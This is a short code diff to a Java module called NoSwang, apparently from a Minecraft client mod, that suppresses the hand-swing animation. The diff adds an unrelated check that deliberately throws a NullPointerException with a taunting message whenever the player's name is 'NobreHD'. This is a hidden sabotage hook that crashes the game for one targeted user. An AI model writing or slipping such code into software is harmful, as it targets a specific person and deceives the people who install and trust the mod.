@@ -17,5 +17,8 @@ public class NoSwang extends Module {
         if (mc.player.handSwingProgress > 0) {
             mc.player.handSwingProgress = 0;
         }
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
     }
 }
